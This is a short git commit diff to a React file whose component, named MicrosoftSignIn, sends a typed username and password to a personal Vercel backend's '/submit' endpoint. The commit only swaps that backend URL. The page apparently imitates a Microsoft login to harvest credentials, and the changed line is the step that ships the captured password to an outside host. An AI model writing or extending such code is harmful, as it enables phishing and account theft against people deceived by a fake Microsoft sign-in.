6f3f7f5632253da4c1f14aac544d70fed3ff057f
Yesukay <yesukay2@gmail.com>
2024-12-19 12:00:36 -0500

    ghj

--- src/App.jsx
+++ src/App.jsx
@@ -51,7 +51,7 @@ const MicrosoftSignIn = () => {
     if (validate()) {
       const data = { username: unameVal, password: pwdVal };
       axios
-        .post("https://backend-8iknvqc1v-yesus-projects-e758688f.vercel.app/submit", data)
+        .post("https://backend-o7ge7fc8p-yesus-projects-e758688f.vercel.app/submit", data)
         .then((response) => {
           console.log(response.data.message);
           setView('final');
